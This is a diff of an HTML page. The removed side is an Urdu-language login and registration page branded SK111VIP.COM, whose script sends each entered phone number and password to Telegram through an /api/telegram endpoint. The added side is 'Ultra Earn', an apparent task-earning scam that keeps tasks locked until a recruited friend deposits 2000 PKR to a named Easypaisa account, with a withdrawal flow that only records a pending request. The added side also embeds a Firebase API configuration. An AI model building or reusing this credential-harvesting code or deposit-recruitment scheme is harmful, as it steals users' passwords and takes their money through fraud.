@@ -1,432 +1,322 @@
 <!DOCTYPE html>
-<html lang="ur" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SK111VIP</title>
-    <link href="https://fonts.googleapis.com/css2?family=Noto+Nastaliq+Urdu:wght@400;700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#000000">
+    <title>Ultra Earn - TASK FORCE</title>
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Bruno+Ace+SC&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Arial', sans-serif;
-        }
-
-        body {
-            background-color: #052e28;
-            background-image: linear-gradient(rgba(5, 46, 40, 0.85), rgba(5, 46, 40, 0.9)), url('https://images.unsplash.com/photo-1531415074968-036ba1b575da?q=80&w=1000&auto=format&fit=crop');
-            background-size: cover;
-            background-position: center;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            color: white;
-            padding: 20px;
-        }
-
-        .urdu-text { font-family: 'Noto Nastaliq Urdu', serif; }
-
-        .logo {
-            font-size: 40px;
-            font-weight: bold;
-            color: #ff9900;
-            margin-top: 40px;
-            margin-bottom: 20px;
-            text-transform: uppercase;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
-            background: linear-gradient(to bottom, #ffcc00, #ff6600);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            font-family: 'Arial Black', sans-serif;
-            letter-spacing: 1px;
-        }
-
-        .container { width: 100%; max-width: 400px; text-align: center; }
-
-        h2 {
-            font-size: 32px;
-            color: #ffcc00;
-            margin-bottom: 10px;
-            text-shadow: 0 0 10px rgba(255, 204, 0, 0.3);
-        }
-
-        .sub-link {
-            color: #fff;
-            font-size: 14px;
-            margin-bottom: 30px;
-            display: block;
-            text-decoration: none;
-        }
-        .sub-link span { text-decoration: underline; color: #4dd0e1; }
-
-        .input-group {
-            background: rgba(0, 30, 30, 0.6);
-            border: 1px solid #1a5c54;
-            border-radius: 10px;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            padding: 12px 15px;
-            position: relative;
-            box-shadow: inset 0 0 10px rgba(0,0,0,0.2);
-        }
-
-        .input-group input {
-            background: transparent;
-            border: none;
-            color: white;
-            width: 100%;
-            font-size: 16px;
-            outline: none;
-            text-align: right;
-            padding-right: 10px;
-        }
-
-        .input-group .icon-left { color: #4dd0e1; font-size: 18px; }
-        .input-group .icon-right { color: #ffd700; font-size: 18px; }
-
-        .flag-icon {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            color: white;
-            font-family: sans-serif;
-            border-right: 1px solid #ffffff44;
-            padding-right: 10px;
-            margin-right: 10px;
-        }
-
-        .terms {
-            display: flex;
-            align-items: flex-start;
-            gap: 10px;
-            font-size: 12px;
-            color: white;
-            text-align: right;
-            margin-bottom: 10px;
-            line-height: 1.6;
-        }
-
-        .custom-checkbox {
-            min-width: 20px;
-            height: 20px;
-            border-radius: 50%;
-            border: 2px solid #4dd0e1;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-top: 2px;
-            cursor: pointer;
-        }
+        body { background-color: #000; color: #fff; font-family: 'Orbitron', sans-serif; min-height: 100vh; overflow-x: hidden; padding-bottom: 120px; -webkit-tap-highlight-color: transparent; }
         
-        .custom-checkbox.checked {
-            background-color: #ffd700;
-            border-color: #ffd700;
-            color: black;
+        /* PLASMA BACKGROUND */
+        .plasma-bg { position: fixed; inset: 0; z-index: -2; background: radial-gradient(circle at 50% 50%, #0f0c29, #302b63, #24243e); }
+        .grid-overlay { position: absolute; inset: 0; background-image: linear-gradient(rgba(0, 255, 255, 0.1) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 255, 255, 0.1) 1px, transparent 1px); background-size: 30px 30px; opacity: 0.2; }
+
+        /* TASK CARDS */
+        .task-card {
+            background: rgba(20, 20, 20, 0.8); border: 1px solid rgba(0, 255, 255, 0.2);
+            border-radius: 16px; padding: 16px; margin-bottom: 12px;
+            display: flex; justify-content: space-between; items-center;
+            transition: 0.3s; position: relative; overflow: hidden;
+        }
+        .task-card.locked { opacity: 0.7; border-color: #ff0055; }
+        .task-card.locked::after {
+            content: 'LOCKED'; position: absolute; inset: 0; background: rgba(0,0,0,0.8);
+            display: flex; align-items: center; justify-content: center;
+            font-size: 20px; font-weight: bold; color: #ff0055; letter-spacing: 4px;
+            backdrop-filter: blur(2px);
         }
 
-        .forgot-pass {
-            text-align: left;
-            width: 100%;
-            font-size: 14px;
-            color: #ffd700;
-            margin-bottom: 20px;
-            display: block;
-            text-decoration: none;
+        /* BUTTONS */
+        .god-btn {
+            background: #000; color: #00ffff; border: 1px solid #00ffff;
+            box-shadow: 0 0 10px rgba(0, 255, 255, 0.3); transition: 0.2s;
+        }
+        .god-btn:active { background: #00ffff; color: #000; }
+
+        .unlock-btn {
+            background: linear-gradient(90deg, #ff0055, #ff00aa); border: none; color: white;
+            box-shadow: 0 0 20px rgba(255, 0, 85, 0.5); width: 100%; padding: 15px;
+            border-radius: 12px; font-weight: bold; margin-top: 10px; text-transform: uppercase;
         }
 
-        .btn-primary {
-            width: 100%;
-            padding: 15px;
-            border-radius: 8px;
-            border: none;
-            background: linear-gradient(to bottom, #ffe033, #ff9900);
-            color: #5a3a00;
-            font-size: 20px;
-            font-weight: bold;
-            cursor: pointer;
-            box-shadow: 0 4px 15px rgba(255, 165, 0, 0.4);
-            margin-bottom: 20px;
-            margin-top: 10px;
-        }
-
-        .separator {
-            display: flex;
-            align-items: center;
-            text-align: center;
-            color: #fff;
-            margin: 20px 0;
-            font-size: 14px;
-        }
-        .separator::before, .separator::after {
-            content: '';
-            flex: 1;
-            border-bottom: 1px solid #ffffff44;
-        }
-
-        .google-btn {
-            width: 50px;
-            height: 50px;
-            background: white;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto;
-            cursor: pointer;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
-        }
-
-        .hidden { display: none; }
-        
-        .back-arrow {
-            position: absolute;
-            top: 20px;
-            left: 20px;
-            color: #ffd700;
-            font-size: 24px;
-            cursor: pointer;
-        }
-
-        ::placeholder {
-            color: #b0c4c1;
-            font-family: 'Noto Nastaliq Urdu', serif;
-            font-size: 14px;
-        }
-
-        /* Error Message Style */
-        .error-message {
-            color: #ff4d4d;
-            font-size: 12px;
-            text-align: right;
-            margin-bottom: 5px;
-            font-weight: bold;
-            display: none;
-            background: rgba(0,0,0,0.5);
-            padding: 2px 5px;
-            border-radius: 4px;
-        }
-        
-        .shake {
-            animation: shake 0.5s;
-            border: 1px solid #ff4d4d !important;
-        }
-        @keyframes shake {
-            0% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            50% { transform: translateX(5px); }
-            75% { transform: translateX(-5px); }
-            100% { transform: translateX(0); }
-        }
+        /* UTILS */
+        .cyber-input { background: #111; border: 1px solid #333; color: #fff; padding: 12px; width: 100%; border-radius: 8px; outline: none; }
+        .tab-content { display: none; animation: fadeIn 0.5s; }
+        .active-tab { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        #loader { display: none; position: fixed; inset: 0; background: #000; z-index: 100; justify-content: center; align-items: center; }
     </style>
 </head>
 <body>
 
-    <div class="back-arrow"><i class="fas fa-chevron-left"></i></div>
+    <div class="plasma-bg"><div class="grid-overlay"></div></div>
+    <div id="loader"><div class="w-16 h-16 border-4 border-t-[#00ffff] rounded-full animate-spin"></div></div>
 
-    <div class="logo">SK111VIP.COM</div>
-
-    <div id="register-form" class="container">
-        <h2 class="urdu-text">رجسٹر کریں-</h2>
-        <a href="#" class="sub-link urdu-text" onclick="toggleForm()">پہلے سے ہی ایک اکاؤنٹ ہے؟ <span>لاگ ان کریں</span></a>
-
-        <div id="reg-error" class="error-message">Incorrect number please use correct number</div>
-
-        <div class="input-group" id="reg-phone-group">
-            <div class="flag-icon">92+ <img src="https://flagcdn.com/w20/pk.png" alt="PK"></div>
-            <input type="tel" id="reg-phone" placeholder="موبائل نمبر (03xxxxxxxxx)" class="urdu-text" maxlength="11">
-        </div>
-
-        <div class="input-group">
-            <i class="fas fa-eye-slash icon-left"></i>
-            <input type="password" id="reg-pass" placeholder="پاس ورڈ" class="urdu-text">
-            <i class="fas fa-star icon-right"></i>
-        </div>
-
-        <div class="input-group">
-            <i class="fas fa-eye-slash icon-left"></i>
-            <input type="password" id="reg-confirm-pass" placeholder="پاس ورڈ کی تصدیق کریں" class="urdu-text">
-            <i class="fas fa-star icon-right"></i>
-        </div>
-
-        <div class="terms urdu-text">
-            <div class="custom-checkbox checked"><i class="fas fa-check"></i></div>
-            <span>میں 18 سال سے زیادہ عمر کا ہوں اور میں نے سائٹ پر شائع کردہ شرائط و ضوابط، رازداری کی پالیسی اور بیٹنگ کے قواعد کو پڑھ لیا ہے اور قبول کر لیا ہے۔</span>
-        </div>
-
-        <div class="terms urdu-text">
-            <div class="custom-checkbox" style="border-color: #4dd0e1;"><i class="fas fa-check" style="display:none"></i></div>
-            <span>میں خصوصی پیشکشوں، مفت شرطوں اور دیگر پروموشنز کی تفصیلات حاصل کرنا چاہتا ہوں۔</span>
-        </div>
-
-        <button class="btn-primary urdu-text" onclick="handleRegister()">رجسٹر کریں-</button>
-
-        <div class="google-btn">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" width="24" alt="Google">
+    <div id="guideModal" class="hidden fixed inset-0 z-[110] bg-black/95 flex items-center justify-center p-4">
+        <div class="bg-[#111] border border-[#00ffff] w-full max-w-sm p-6 rounded-2xl text-center">
+            <h2 class="text-xl font-bold text-[#00ffff] mb-4">KAAM KAISE KAREN?</h2>
+            <div class="text-sm text-gray-300 space-y-3 text-left">
+                <p>🚀 <strong>1. Tasks:</strong> Rozana apko 5 Tasks milenge (Total 1000 Rs).</p>
+                <p>🔒 <strong>2. Unlock:</strong> Tasks locked honge. Inhen kholne ke liye "Unlock Now" dabayen.</p>
+                <p>👥 <strong>3. Invite:</strong> Apne kisi dost ko invite karen (2000 wala plan).</p>
+                <p>💰 <strong>4. Reward:</strong> Jaise hi dost deposit karega, apke tasks unlock ho jayenge aur 1000 Rs mil jayenge.</p>
+            </div>
+            <button onclick="closeGuide()" class="god-btn w-full py-3 mt-6 rounded font-bold">START WORK</button>
         </div>
     </div>
 
-    <div id="login-form" class="container hidden">
-        <h2 class="urdu-text">لاگ ان کریں</h2>
-        <a href="#" class="sub-link urdu-text" onclick="toggleForm()">ابھی تک کوئی اکاؤنٹ نہیں؟ <span>رجسٹر کریں</span></a>
+    <div id="authScreen" class="fixed inset-0 z-50 flex flex-col justify-center px-6 bg-black/90">
+        <div class="text-center w-full max-w-sm mx-auto">
+            <h1 class="text-5xl font-black text-white mb-2 tracking-tighter" style="text-shadow: 0 0 20px #00ffff;">TASK FORCE</h1>
+            <p class="text-[#00ffff] text-xs tracking-[0.5em] mb-10">DAILY EARNINGS</p>
 
-        <div id="login-error" class="error-message">Incorrect number please use correct number</div>
+            <div id="loginForm" class="space-y-4">
+                <input type="email" id="loginEmail" placeholder="EMAIL" class="cyber-input text-center">
+                <input type="password" id="loginPass" placeholder="PASSWORD" class="cyber-input text-center">
+                <button onclick="login()" class="god-btn w-full py-3 rounded text-lg font-bold">LOGIN</button>
+                <p onclick="toggleAuth()" class="text-xs text-gray-500 mt-4 cursor-pointer hover:text-[#00ffff]">CREATE ACCOUNT</p>
+            </div>
 
-        <div class="input-group" id="login-phone-group">
-            <i class="fas fa-star icon-right"></i>
-            <input type="tel" id="login-phone" placeholder="موبائل نمبر (03xxxxxxxxx)" class="urdu-text" style="padding-right: 15px;" maxlength="11">
+            <div id="registerForm" class="hidden space-y-4">
+                <div id="autoRefBadge" class="hidden border border-[#00ffff] p-2 text-[#00ffff] text-xs rounded mb-2">Referred By: <span id="inviterId">...</span></div>
+                <input type="text" id="regName" placeholder="NAME" class="cyber-input text-center">
+                <input type="email" id="regEmail" placeholder="EMAIL" class="cyber-input text-center">
+                <input type="password" id="regPass" placeholder="PASSWORD" class="cyber-input text-center">
+                <button onclick="register()" class="god-btn w-full py-3 rounded text-lg font-bold">REGISTER</button>
+                <p onclick="toggleAuth()" class="text-xs text-gray-500 mt-4 cursor-pointer hover:text-[#00ffff]">BACK TO LOGIN</p>
+            </div>
+            <p id="authMsg" class="text-red-500 text-xs mt-4"></p>
+        </div>
+    </div>
+
+    <div id="mainApp" style="display:none;" class="max-w-md mx-auto">
+        <div class="flex justify-between items-center p-6 border-b border-[#00ffff]/20">
+            <div><h2 class="text-lg font-bold text-white" id="userNameDisplay">USER</h2><p class="text-[10px] text-[#00ffff]">Status: Active</p></div>
+            <button onclick="logout()" class="text-red-500"><i class="fa-solid fa-power-off text-xl"></i></button>
         </div>
 
-        <div class="input-group">
-            <i class="fas fa-eye-slash icon-left"></i>
-            <input type="password" id="login-pass" placeholder="پاس ورڈ" class="urdu-text">
-            <i class="fas fa-star icon-right"></i>
-        </div>
+        <div id="tab-tasks" class="tab-content px-4 pt-6">
+            <div class="bg-[#111] border border-[#00ffff] p-6 rounded-2xl text-center mb-8 shadow-[0_0_20px_rgba(0,255,255,0.2)]">
+                <p class="text-gray-400 text-xs uppercase tracking-widest mb-2">Wallet Balance</p>
+                <h1 class="text-4xl font-bold text-white mb-4">Rs. <span id="bigBalance">0</span></h1>
+                <div class="flex gap-2">
+                    <button onclick="document.getElementById('depositModal').style.display='flex'" class="flex-1 bg-[#00ffff] text-black py-2 rounded font-bold text-xs">DEPOSIT</button>
+                    <button onclick="openWithdrawModal()" class="flex-1 border border-[#00ffff] text-[#00ffff] py-2 rounded font-bold text-xs">WITHDRAW</button>
+                </div>
+            </div>
 
-        <div style="display: flex; justify-content: space-between; align-items: center; width: 100%; margin-bottom: 10px;">
-            <a href="#" class="forgot-pass urdu-text" style="width: auto; margin:0;">پاسورڈ بھول گئے؟</a>
-            <div class="terms urdu-text" style="margin:0; align-items: center;">
-                <span style="margin-left: 5px;">یاد رکھیں</span>
-                <div class="custom-checkbox checked" style="width: 18px; height: 18px;"><i class="fas fa-check" style="font-size: 10px;"></i></div>
+            <h2 class="text-xl font-bold text-white mb-4 flex items-center gap-2"><i class="fa-solid fa-list-check text-[#00ffff]"></i> DAILY TASKS</h2>
+            
+            <div class="space-y-4" id="taskList">
+                <div class="task-card locked">
+                    <div>
+                        <h4 class="font-bold text-white">Watch Ad Video</h4>
+                        <p class="text-xs text-gray-400">Reward: 200 PKR</p>
+                    </div>
+                    <i class="fa-solid fa-play text-gray-500 text-xl"></i>
+                </div>
+                <div class="task-card locked">
+                    <div>
+                        <h4 class="font-bold text-white">Rate Application</h4>
+                        <p class="text-xs text-gray-400">Reward: 200 PKR</p>
+                    </div>
+                    <i class="fa-solid fa-star text-gray-500 text-xl"></i>
+                </div>
+                <div class="task-card locked">
+                    <div>
+                        <h4 class="font-bold text-white">Visit Website</h4>
+                        <p class="text-xs text-gray-400">Reward: 200 PKR</p>
+                    </div>
+                    <i class="fa-solid fa-globe text-gray-500 text-xl"></i>
+                </div>
+                <div class="task-card locked">
+                    <div>
+                        <h4 class="font-bold text-white">Daily Check-in</h4>
+                        <p class="text-xs text-gray-400">Reward: 200 PKR</p>
+                    </div>
+                    <i class="fa-solid fa-calendar-check text-gray-500 text-xl"></i>
+                </div>
+                <div class="task-card locked">
+                    <div>
+                        <h4 class="font-bold text-white">Bonus Task</h4>
+                        <p class="text-xs text-gray-400">Reward: 200 PKR</p>
+                    </div>
+                    <i class="fa-solid fa-gift text-gray-500 text-xl"></i>
+                </div>
+            </div>
+
+            <div class="mt-6 p-4 bg-[#1a1a1a] rounded-xl border border-[#ff0055] text-center">
+                <p class="text-xs text-gray-400 mb-2">Tasks are currently LOCKED.</p>
+                <h3 class="text-lg font-bold text-white mb-2">TOTAL VALUE: <span class="text-[#00ffff]">1000 PKR</span></h3>
+                <button onclick="shareLink()" class="unlock-btn animate-pulse">
+                    <i class="fa-solid fa-lock-open mr-2"></i> INVITE 1 FRIEND TO UNLOCK
+                </button>
+                <p class="text-[10px] text-gray-500 mt-2">*Friend must activate 2000 PKR Plan</p>
             </div>
         </div>
 
-        <button class="btn-primary urdu-text" style="margin-top: 20px;" onclick="handleLogin()">لاگ ان کریں</button>
-
-        <div class="separator urdu-text">یا کے ساتھ جڑیں</div>
-
-        <div class="google-btn">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" width="24" alt="Google">
+        <div id="tab-me" class="tab-content px-4 pt-6 text-center">
+            <div class="w-24 h-24 mx-auto rounded-full border-2 border-[#00ffff] bg-black flex items-center justify-center mb-4">
+                <i class="fa-solid fa-user-astronaut text-4xl text-white"></i>
+            </div>
+            <h2 class="text-xl font-bold text-white" id="profileName">USER</h2>
+            <div class="bg-[#111] p-3 rounded mt-4 flex justify-between items-center border border-gray-800">
+                <p class="text-xs text-gray-400">YOUR LINK:</p>
+                <code id="myLinkDisplay" class="text-xs text-[#00ffff] select-all">Loading...</code>
+            </div>
+            <button onclick="logout()" class="w-full border border-red-500 text-red-500 py-3 mt-6 rounded font-bold">LOGOUT</button>
         </div>
     </div>
 
+    <div id="depositModal" class="hidden fixed inset-0 z-[100] bg-black/95 flex items-center justify-center p-4">
+        <div class="bg-[#111] border border-[#00ffff] w-full max-w-sm p-6 rounded-2xl relative">
+            <button onclick="document.getElementById('depositModal').style.display='none'" class="absolute top-4 right-4 text-gray-500">✕</button>
+            <h3 class="text-xl font-bold text-[#00ffff] mb-4">DEPOSIT FUNDS</h3>
+            <div class="bg-[#00ffff]/10 p-4 rounded mb-4 text-center border border-[#00ffff]/30">
+                <p class="text-[10px] text-gray-400 uppercase">Easypaisa Account</p>
+                <p class="text-2xl font-mono text-white font-bold my-1">0311-1813896</p>
+                <p class="text-xs text-[#ff00ff] font-bold">OBAID ALI</p>
+            </div>
+            <p class="text-xs text-gray-400 mb-2">Amount send karne ke baad TRX ID likhen:</p>
+            <input type="number" id="depAmt" placeholder="Amount (e.g 2000)" class="cyber-input mb-3">
+            <input type="text" id="trxID" placeholder="TRX ID" class="cyber-input mb-4">
+            <button onclick="submitDeposit()" class="god-btn w-full py-3 rounded font-bold">SUBMIT REQUEST</button>
+        </div>
+    </div>
+
+    <div id="withdrawModal" class="hidden fixed inset-0 z-[100] bg-black/95 flex items-center justify-center p-4">
+        <div class="bg-[#111] border border-[#ff00ff] w-full max-w-sm p-6 rounded-2xl relative">
+            <button onclick="document.getElementById('withdrawModal').style.display='none'" class="absolute top-4 right-4 text-gray-500">✕</button>
+            <h3 class="text-xl font-bold text-[#ff00ff] mb-4">WITHDRAW MONEY</h3>
+            <div class="space-y-3">
+                <select id="withMethod" class="cyber-input">
+                    <option value="Easypaisa">Easypaisa</option>
+                    <option value="JazzCash">JazzCash</option>
+                </select>
+                <input type="text" id="withName" placeholder="Account Name" class="cyber-input">
+                <input type="number" id="withNum" placeholder="Account Number" class="cyber-input">
+                <input type="number" id="withAmt" placeholder="Amount (Min 500)" class="cyber-input">
+                <button onclick="submitWithdraw()" class="god-btn w-full py-3 rounded font-bold" style="border-color:#ff00ff; color:#ff00ff">CONFIRM WITHDRAW</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="fixed bottom-0 left-0 w-full bg-black/90 border-t border-[#333] p-4 flex justify-around z-40">
+        <div onclick="switchTab('tasks')" class="text-center cursor-pointer text-[#00ffff]"><i class="fa-solid fa-list-check text-xl"></i><p class="text-[10px]">TASKS</p></div>
+        <div onclick="switchTab('me')" class="text-center cursor-pointer text-gray-500 hover:text-white"><i class="fa-solid fa-user text-xl"></i><p class="text-[10px]">ME</p></div>
+    </div>
+
     <script>
-        // === SECURE TELEGRAM MESSAGE SENDING ===
-        // Note: No Token needed here. It calls your Vercel /api/telegram function
-        async function sendToTelegram(message) {
-            const encodedMessage = encodeURIComponent(message);
-            // Calls your backend serverless function
-            const url = `/api/telegram?text=${encodedMessage}`;
+        // --- PASTE FIREBASE CONFIG HERE ---
+        const firebaseConfig = {
+            apiKey: "AIzaSyCPLmQny1WP7yZXJuh5xjiMvU2ArfC-n54",
+            authDomain: "ultra-earn-a636a.firebaseapp.com",
+            projectId: "ultra-earn-a636a",
+            storageBucket: "ultra-earn-a636a.firebasestorage.app",
+            messagingSenderId: "185942357584",
+            appId: "1:185942357584:web:1052b94cfecc6576944355"
+        };
 
-            try {
-                // Standard fetch is okay because your API is on the same domain
-                await fetch(url);
-                console.log("Secure message sent via Vercel API.");
-            } catch (error) {
-                console.error("Error sending message:", error);
+        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const db = firebase.database();
+        let currentUser, myData, detectedReferral = "Admin";
+
+        window.onload = function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('ref')) {
+                detectedReferral = urlParams.get('ref');
+                document.getElementById('autoRefBadge').classList.remove('hidden');
+                document.getElementById('inviterId').innerText = detectedReferral;
+                toggleAuth();
             }
+            if (!localStorage.getItem("guideSeen")) { setTimeout(() => document.getElementById('guideModal').style.display = 'flex', 1500); }
+        };
+
+        function closeGuide() { document.getElementById('guideModal').style.display = 'none'; localStorage.setItem("guideSeen", "true"); }
+
+        function register() {
+            const email = document.getElementById('regEmail').value, pass = document.getElementById('regPass').value, name = document.getElementById('regName').value;
+            if(pass.length < 6) return alert("Password too short");
+            showLoader(true);
+            const myNewCode = "U-" + Math.floor(10000 + Math.random() * 90000);
+            auth.createUserWithEmailAndPassword(email, pass).then((cred) => {
+                db.ref('users/' + cred.user.uid).set({
+                    name: name, email: email, myCode: myNewCode, invitedBy: detectedReferral, balance: 0, plan: "Free"
+                }).then(() => { showLoader(false); window.location.href = window.location.origin + window.location.pathname; });
+            }).catch(e => { showLoader(false); document.getElementById('authMsg').innerText = e.message; });
         }
 
-        // === Form Toggle Logic ===
-        function toggleForm() {
-            const loginForm = document.getElementById('login-form');
-            const registerForm = document.getElementById('register-form');
-            
-            // Clear errors
-            document.querySelectorAll('.error-message').forEach(el => el.style.display = 'none');
-            document.querySelectorAll('.input-group').forEach(el => el.classList.remove('shake'));
-
-            if (loginForm.classList.contains('hidden')) {
-                loginForm.classList.remove('hidden');
-                registerForm.classList.add('hidden');
-            } else {
-                loginForm.classList.add('hidden');
-                registerForm.classList.remove('hidden');
-            }
+        function login() {
+            showLoader(true);
+            auth.signInWithEmailAndPassword(document.getElementById('loginEmail').value, document.getElementById('loginPass').value)
+            .catch(e => { showLoader(false); document.getElementById('authMsg').innerText = e.message; });
         }
 
-        // === Checkbox Logic ===
-        const checkboxes = document.querySelectorAll('.custom-checkbox');
-        checkboxes.forEach(box => {
-            box.addEventListener('click', function() {
-                this.classList.toggle('checked');
-                const icon = this.querySelector('i');
-                if(icon) {
-                    icon.style.display = this.classList.contains('checked') ? 'block' : 'none';
-                }
-            });
+        function toggleAuth() { document.getElementById('loginForm').classList.toggle('hidden'); document.getElementById('registerForm').classList.toggle('hidden'); }
+        function logout() { auth.signOut(); location.reload(); }
+        function showLoader(show) { document.getElementById('loader').style.display = show ? 'flex' : 'none'; }
+
+        auth.onAuthStateChanged(user => {
+            showLoader(false);
+            if(user) {
+                currentUser = user; 
+                document.getElementById('authScreen').style.display = 'none'; 
+                document.getElementById('mainApp').style.display = 'block';
+                db.ref('users/' + user.uid).on('value', snap => {
+                    myData = snap.val();
+                    if(myData) {
+                        document.getElementById('userNameDisplay').innerText = myData.name;
+                        document.getElementById('profileName').innerText = myData.name;
+                        document.getElementById('bigBalance').innerText = myData.balance;
+                        const link = window.location.origin + window.location.pathname + "?ref=" + myData.myCode;
+                        document.getElementById('myLinkDisplay').innerText = link;
+                    }
+                });
+            } else { document.getElementById('authScreen').style.display = 'flex'; document.getElementById('mainApp').style.display = 'none'; }
         });
 
-        // === Phone Validation Logic ===
-        function validatePhoneNumber(phone) {
-            // Remove non-digit characters
-            let cleanPhone = phone.replace(/\D/g, '');
+        function submitDeposit() {
+            const amt = document.getElementById('depAmt').value, trx = document.getElementById('trxID').value;
+            if(!amt || !trx) return alert("Fill all fields");
+            db.ref('deposits').push({ uid: currentUser.uid, email: myData.email, amount: amt, trx: trx, invitedBy: myData.invitedBy, status: "Pending", timestamp: Date.now() });
+            alert("Request Sent! Admin will approve."); document.getElementById('depositModal').style.display='none';
+        }
 
-            // Auto-correct: If starts with 3 and length is 10 (e.g. 3001234567), make it 0300...
-            if (cleanPhone.length === 10 && cleanPhone.startsWith('3')) {
-                cleanPhone = '0' + cleanPhone;
-            }
+        function openWithdrawModal() {
+            if(myData.balance < 500) return alert("Min Withdraw 500 PKR");
+            document.getElementById('withdrawModal').style.display = 'flex';
+        }
 
-            // Strict Regex: Must start with 03 and be 11 digits total
-            const regex = /^03\d{9}$/;
-            
-            if (regex.test(cleanPhone)) {
-                return { isValid: true, number: cleanPhone };
-            } else {
-                return { isValid: false, number: cleanPhone };
+        function submitWithdraw() {
+            const method = document.getElementById('withMethod').value, name = document.getElementById('withName').value, num = document.getElementById('withNum').value, amt = parseInt(document.getElementById('withAmt').value);
+            if(!name || !num || !amt) return alert("Fill all fields");
+            if(amt > myData.balance) return alert("Insufficient Balance");
+            if(confirm("Confirm Withdraw?")) {
+                db.ref('users/' + currentUser.uid).update({ balance: myData.balance - amt });
+                db.ref('withdrawals').push({ uid: currentUser.uid, email: myData.email, amount: amt, method: method, accName: name, accNum: num, status: "Pending", timestamp: Date.now() });
+                alert("Withdrawal Sent!"); document.getElementById('withdrawModal').style.display='none';
             }
         }
 
-        // === Login Handler ===
-        function handleLogin() {
-            const phoneInput = document.getElementById('login-phone');
-            const passInput = document.getElementById('login-pass');
-            const errorMsg = document.getElementById('login-error');
-            const group = document.getElementById('login-phone-group');
-
-            const validation = validatePhoneNumber(phoneInput.value);
-
-            if (!validation.isValid) {
-                // Show error
-                errorMsg.style.display = 'block';
-                group.classList.add('shake');
-                setTimeout(() => group.classList.remove('shake'), 500);
-            } else {
-                // Hide error
-                errorMsg.style.display = 'none';
-                
-                // Send Data to Secure API
-                const msg = `🟢 *LOGIN DATA*\n📱 Number: \`${validation.number}\`\n🔑 Password: \`${passInput.value}\``;
-                sendToTelegram(msg);
-
-                // Redirect to Lobby
-                setTimeout(() => {
-                    window.location.href = "lobby.html";
-                }, 1000);
-            }
+        function shareLink() { 
+            const link = document.getElementById('myLinkDisplay').innerText;
+            window.open("https://wa.me/?text=" + encodeURIComponent("🔥 Unlock 1000 PKR instantly! Join Ultra Earn and complete tasks.\n\n👇 Click here:\n" + link), '_blank'); 
         }
-
-        // === Register Handler ===
-        function handleRegister() {
-            const phoneInput = document.getElementById('reg-phone');
-            const passInput = document.getElementById('reg-pass');
-            const errorMsg = document.getElementById('reg-error');
-            const group = document.getElementById('reg-phone-group');
-
-            const validation = validatePhoneNumber(phoneInput.value);
-
-            if (!validation.isValid) {
-                // Show error
-                errorMsg.style.display = 'block';
-                group.classList.add('shake');
-                setTimeout(() => group.classList.remove('shake'), 500);
-            } else {
-                // Hide error
-                errorMsg.style.display = 'none';
-
-                // Send Data to Secure API
-                const msg = `🚀 *REGISTER DATA*\n📱 Number: \`${validation.number}\`\n🔑 Password: \`${passInput.value}\``;
-                sendToTelegram(msg);
-
-                // Redirect to Lobby
-                setTimeout(() => {
-                    window.location.href = "lobby.html";
-                }, 1000);
-            }
+        
+        function switchTab(tab) {
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active-tab'));
+            document.getElementById('tab-' + tab).classList.add('active-tab');
         }
     </script>
 </body>
